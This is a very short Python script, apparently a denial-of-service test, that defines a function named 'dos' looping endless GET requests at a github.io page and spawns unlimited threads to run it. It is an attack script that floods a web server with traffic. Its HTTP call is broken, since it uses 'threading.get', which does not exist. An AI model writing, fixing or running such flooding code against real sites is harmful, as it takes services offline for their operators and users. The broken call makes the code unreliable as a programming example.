import threading
def dos():
 while True:
  threading.get("https://leo-ni-d.github.io/Testsdos/")
  
while True:
 threading.Thread(target=dos).start()   
         